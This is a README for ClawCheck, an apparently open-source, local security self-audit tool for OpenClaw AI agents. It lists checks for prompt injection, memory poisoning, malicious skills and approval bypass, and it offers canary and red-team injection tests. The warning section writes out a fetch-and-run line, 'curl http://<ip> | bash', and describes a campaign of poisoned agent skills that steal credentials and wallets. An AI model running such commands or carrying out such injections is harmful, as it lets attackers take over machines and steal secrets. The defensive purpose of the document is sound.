# ClawCheck 🔍 — OpenClaw Security Self-Audit Skill

**Free. Local. Read-only. No API key. Your data never leaves your machine.**

A one-command security self-audit for *your own* OpenClaw agent. It scores your setup
**A–F**, surfaces the most urgent holes in plain language, and gives copy-paste fixes —
plus a **shareable grade badge**.

Because you run it on your own agent, there's no "scanning someone else" problem: no
proof-of-ownership, no legal grey area.

## ⚠️ Important — trust no one (including this skill)

OpenClaw skills are **not sandboxed**: an installed skill runs with your agent's full
permissions. The ClawHavoc campaign poisoned ClawHub with **hundreds of malicious skills**
that steal credentials and crypto wallets — a single line of markdown can hide a
`curl http://<ip> | bash`.

So, before you download, install, or use **any** skill (this one included):

1. **Read the source** — it's plain text. If you can't see what it does, don't run it.
2. **Have your agent analyse it for you** — ask OpenClaw to review the skill's `SKILL.md`
   and scripts for shell-exec, credential access, paste-host uploads, and obfuscated
   (base64) payloads *before* enabling it. ClawCheck does this with `--vet <skill>`.
3. **Pin a known release**, prefer signed / VirusTotal-clean skills, and rotate any secret a
   skill could have reached if you ever suspect it.

ClawCheck practises this: it is open source, zero-dependency, read-only, and its **B13** check
does exactly this vetting on the skills you've *already* installed. Trust is earned by being
readable — so read it.

## Why another audit tool?

The built-in `openclaw security audit` and tools like Trent/ClawSec are good — but:

- The native audit **does not inspect the content of your bootstrap files**
  (`SOUL.md`, `AGENTS.md`, `TOOLS.md`): they're injected into the system prompt as *trusted
  context* with no validation. ClawCheck **does** check them for prompt-injection-prone
  directives (our check **B6**).
- ClawCheck is **100% local** — no API key, nothing transmitted (Trent uploads your config;
  the native one is CLI-only).
- It leads with a **shareable Score + Grade + Lethal Trifecta ratio** you can post to the
  community — without ever exposing your actual findings.

## What it checks

- **Lethal Trifecta** (untrusted input × sensitive data × outbound actions — keep ≤2 of 3)
- Gateway exposure & channel auth, plaintext secrets, least privilege, execution sandbox,
  plugin/skill supply-chain integrity, bootstrap-file injection surface, memory poisoning,
  human approval, secret-leak/redaction, TLS, local-first/model hygiene.
- **B13 — installed-skill / plugin vetting:** scans the *content* of skills you downloaded
  (not made yourself) for the ClawHavoc malware class, including base64-hidden payloads.
- **B14 — egress surface:** where the agent can reach out (channels, external skills, tools).
- **B15 — MCP server trust** boundaries.
- **B16 — threat monitoring:** whether you actually have monitoring/detection set up at all.
- **B17 — autonomy / heartbeat:** whether the agent acts on its own and could be steered by untrusted input.
- **B18 — subagent delegation:** whether spawned subagents can wield elevated/exec tools without approval.
- **B19 — data at-rest:** group/world-readable memory/log directories (conversation data / PII exposure).
- **B20–B24 — agent behavior:** write-protection of identity/memory files, tool-output trust boundary,
  self-modification risk, approval-bypass directives, and deep MCP-server hardening.
- Plus your platform's own **`openclaw security audit`**, run for you and merged in.

## Built-in audit, included for you

Non-technical users will never open a terminal to run OpenClaw's own
`openclaw security audit`. So ClawCheck runs it **for you** (read-only) and folds its
findings into the same plain-language report — one button shows both ClawCheck's checks
*and* the platform's own audit. Native findings are shown but are **not** mixed into the
ClawCheck score (kept deterministic). Disable with `--no-native`.

## Trust / provenance

ClawCheck is **open source and zero-dependency (Python stdlib only)**. Its own checks are
**read-only and offline** — they read only `~/.openclaw/openclaw.json` and your workspace
bootstrap markdown files, and make **no network calls**. It writes nothing by default; the only
writes are ones you ask for — a report file (`--save`) and the `--monitor` snapshot at
`~/.clawcheck/state.json`. It never touches your OpenClaw config or data.

The **only** external command it can run is your own, fixed and read-only:

```
openclaw security audit --json
```

No shell, never `--fix`, with a timeout; skip it entirely with `--no-native`. The entire
source is in [`clawcheck/`](clawcheck/) — read it before you trust it. Amid the ClawHavoc
malicious-skill wave, an audit skill should prove its own safety; this one does.

## Install & run

```bash
openclaw skills install git:gl0di/clawcheck      # from GitHub
openclaw skills install clawcheck                # from ClawHub (once published)
# then ask your agent: "audit my OpenClaw setup with clawcheck"
```

Or install it as a standalone CLI (zero dependencies):

```bash
pipx install git+https://github.com/gl0di/clawcheck   # or: pip install .
clawcheck --home ~/.openclaw                            # then just `clawcheck`
python -m clawcheck                                     # also works
```

Or run the bundled script directly (Linux/macOS):

```bash
python3 audit.py                 # human report + shareable card
python3 audit.py --json          # machine-readable
python3 audit.py --card          # just the badge
python3 audit.py --ascii         # plain output (no unicode icons/box)
python3 audit.py --home ~/.openclaw
```

On **Windows** use `python` (or `py`); the script auto-detects consoles that can't render
unicode and falls back to ASCII, or force it with `--ascii`:

```bat
python audit.py
py audit.py --card --ascii
```

Cross-platform: pure Python stdlib, pathlib-based paths, POSIX file-permission checks are
skipped on Windows (NTFS uses ACLs), and all output has an ASCII fallback.

## Updating

OpenClaw remembers where a skill came from, so users get your new versions by updating:

```bash
openclaw skills update clawcheck     # pull the latest from its source (Git/ClawHub)
clawhub update --all                 # update every installed skill
```

(Or re-run the install command.) An auto-updater skill / `update.auto.enabled` in
`~/.openclaw/openclaw.json` can update on a schedule. Because skills run with the agent's full
permissions, a malicious *update* is a real supply-chain risk — so each release here is tagged
and the source is public to read **before** updating. Prefer reviewing/pinning a tag over blind
auto-update for anything security-sensitive.

## Guided mode

When you run ClawCheck inside OpenClaw, the agent walks you through the entire audit
conversationally — you never need to know a flag. After every default run, ClawCheck prints a
short **"What you can do next"** block: a prioritised list of the most relevant follow-up steps
for *your* findings, with the exact command to run each one.

The same list is available two other ways:

```bash
python3 audit.py --next          # print the next-steps block only (after running the audit)
python3 audit.py --json          # includes a "next_actions" array in the JSON envelope
```

The recommendations are driven by your actual results — open FAIL findings surface `--prompts`
first; unvetted third-party skills surface `--vet`; no monitoring detected surfaces `--monitor`;
and so on. When there is nothing urgent, the block tells you so and suggests the lighter follow-ups
(trend tracking, grade sharing).

**ClawCheck never applies a fix or changes your config.** For every open finding, `--prompts`
gives you a ready copy-paste prompt to hand to your agent (or apply yourself); the change is
yours to make. Everything stays local.

## How you get the report

When you run the skill inside OpenClaw, the agent executes `audit.py`, captures its output,
and shows it to you **right there in the chat** — no terminal, no setup. You see:

1. your **Score / Grade / Lethal Trifecta** ratio,
2. the **fix list, most urgent first**, in plain language, and
3. a **shareable badge** (grade only — safe to post; the findings stay private).

To keep a copy, add `--save report.txt` and ClawCheck writes the full report to that file
(written only when you ask). For automation, `--json` gives a machine-readable result.

## Threat monitoring

Two complementary things:

**B16 — do you have monitoring at all?** ClawCheck checks whether you have threat
monitoring/detection set up — an agent with none won't alert you if it's compromised. B16 looks
for a monitoring skill/plugin (ClawSec, `openclaw-security-monitor`, …) or monitoring/alerts
config; if none is found it warns you and tells you how to add one.

**`--monitor` — built-in lightweight monitoring.** One way to *get* monitoring: re-audit on a
schedule and alert on what **changed** — a new or modified installed skill, `SOUL.md` drift, a
dropped score, a check going PASS → FAIL.

```bash
python3 audit.py --monitor                 # first run = baseline, then alerts on changes
python3 audit.py --monitor --state ~/.clawcheck/state.json
```

Schedule it via OpenClaw's heartbeat or cron; when an alert fires, have your agent message you.
It stores one small snapshot at `~/.clawcheck/state.json`. (Scheduled re-audit + drift
detection — not a real-time runtime IDS; that heavier model is intentionally out of scope.)

## CI / automation

```bash
python3 audit.py --sarif results.sarif      # write SARIF 2.1.0 locally (for GitHub Code Scanning upload step)
python3 audit.py --fail-under 70            # exit 1 if score < 70 (use in CI pipelines)
python3 audit.py --exit-code                # exit 1 if any unsuppressed FAIL finding
```

The SARIF file is written to the path you choose — ClawCheck never uploads it anywhere.
`--fail-under` and `--exit-code` do not change the default exit code (0) when omitted,
preserving backward compatibility.

## More tools

```bash
python3 audit.py --next                    # print the "What you can do next" guidance block only
python3 audit.py --vet ./some-skill        # vet a skill (dir or SKILL.md) BEFORE installing it
python3 audit.py --canary                   # active prompt-injection self-test (battle-tested)
python3 audit.py --redteam                   # a multi-scenario adversarial payload suite
python3 audit.py --dryrun                     # runtime behavioral test (fake secret + fake tools)
python3 audit.py --badge badge.svg          # write a shareable SVG grade badge
python3 audit.py --html report.html         # standalone HTML report (private — owner view)
python3 audit.py --verify-self               # SHA-256 of ClawCheck's own source (anti-tamper)
python3 audit.py --prompts                   # a copy-paste "ask your agent to fix it" per finding
python3 audit.py --lang he                   # Hebrew report (right-to-left); default auto-detects locale
python3 audit.py --trend                     # print local score trend (stored in ~/.clawcheck/history.jsonl)
python3 audit.py --percentile                # show where your score sits vs. an offline reference profile
python3 audit.py --history ~/.clawcheck/history.jsonl  # custom history file path (default shown)
python3 audit.py --verbose                   # INFO-level log to stderr (secrets redacted)
python3 audit.py --debug                     # DEBUG-level log to stderr (secrets redacted)
python3 audit.py --log audit.log            # also write log to a local file
```

- **`--next`** prints the "What you can do next" guidance block on its own — runs the audit
  first, then shows only the prioritised next-steps list. Same content as the block appended to
  the default report; useful if you want to re-check recommendations without re-reading the full
  report.
- **`--vet PATH`** runs the B13 malware scan on a skill *before* you install it (point it at a
  downloaded folder or `SKILL.md`; for a URL, clone it first, then vet the local copy). Verdict:
  SAFE / SUSPICIOUS / DANGEROUS.
- **`--canary`** emits a benign injection hidden in untrusted-looking content; feed it to your
  agent — if the agent echoes the token, it obeyed an injection (**VULNERABLE**), otherwise
  **RESISTANT**. This is the live "battle-tested" complement to the passive checks.
- **`--badge PATH`** writes a shields-style SVG (grade + score only) for your README / posts.
- **`--prompts`** turns every finding into a ready prompt you paste into your agent to fix it.
- **`--trend`** records the current audit result to a local append-only history file and prints
  a table of past scores with per-run arrows. History stays on your machine only.
- **`--percentile`** compares your score against a bundled offline reference profile — no network,
  no telemetry.
- **`--verbose` / `--debug` / `--log PATH`** activate structured local logging. Config values
  that may hold secrets are redacted before being written (practising ClawCheck's own B9/B10).

## Baseline (accepting findings)

Reviewed a finding and decided it's acceptable? Add it to `~/.openclaw/.clawcheckignore` —
one entry per line, either a check id (`B14`) or a finding fingerprint (`B14:ab12cd34`, shown
with `--show-suppressed`). Suppressed findings drop out of the **score**, the **report**, and
**monitor** alerts — so re-runs and `--monitor` stop nagging about things you've accepted.

```
# ~/.openclaw/.clawcheckignore
B14            # accept the egress-surface advisory
B12:1a2b3c4d   # accept one specific local-model finding
```

## Scoring

Weighted pass-rate (CRITICAL=10, HIGH=6, MEDIUM=3, LOW=1). **Honesty hard-caps:** any open
CRITICAL caps the score at 49, any open HIGH at 79 — you can never show an "A" with a critical
hole. Grades: A 90+ · B 80–89 · C 70–79 · D 50–69 · F <50. The shareable card shows **only the
grade + score + trifecta ratio — never the findings** (sharing must not hand attackers your map).

## Status

v0.13. Read-only checks A1/B1–B25/C3–C5 (incl. write-protection, self-modification,
approval-bypass, deep MCP, update/pinning hygiene), installed-skill malware vetting, baseline
suppression + governance, the built-in `openclaw security audit` merged in, active injection
tests (`--canary`/`--redteam`), a runtime dry-run harness (`--dryrun`), HTML report,
self-integrity (`--verify-self`), a pip/pipx-installable CLI — hardened per an external
security review — **fully bilingual output** (`--lang he` for Hebrew + RTL, auto-detected from
locale; dynamic finding detail now translated too, not just chrome + titles + static strings) —
**CI gating** (`--sarif`, `--fail-under`, `--exit-code`) — **local score history
and offline percentile** (`--trend`, `--percentile`, `--history`) — **local logging with
secret redaction** (`--verbose`, `--debug`, `--log`) — full Hebrew dynamic detail/fix
translations via render-time fragment-splitting — a reliability FP/FN fixture corpus — and
**guided mode**: a "What you can do next" recommendation block printed after every default run
(also in `--json` as `next_actions` and standalone via `--next`), plus a rewritten
conversational SKILL.md playbook that walks non-technical users through every tool without
needing to know a flag. All checks are grounded against the real OpenClaw schema (verified from
docs.openclaw.ai and live fleet configs), so they fire on real installations rather than silently
missing phantom field paths. ClawCheck still only checks and guides — it never applies fixes or
changes your config.

## Roadmap

**Everything stays local. No telemetry, no phone-home, ever.** ClawCheck makes no network
calls and transmits nothing — that is the whole point of a trust-first audit tool born amid the
ClawHavoc exfiltration wave. Any "analytics" here is computed and stored **only on your machine**;
the only thing that ever leaves is what *you* choose to post (the shareable grade badge). Planned,
all local-only:

- **Shipped in v0.12:** Full Hebrew dynamic detail — finding "why"/evidence text with
  interpolated config values (paths, key names, counts) is now translated at render time via
  fragment-splitting + regex rules. The bilingual work begun in v0.9 is complete.

## Tests

```bash
python3 -m pytest -q
```

## License

MIT — see [LICENSE](LICENSE).
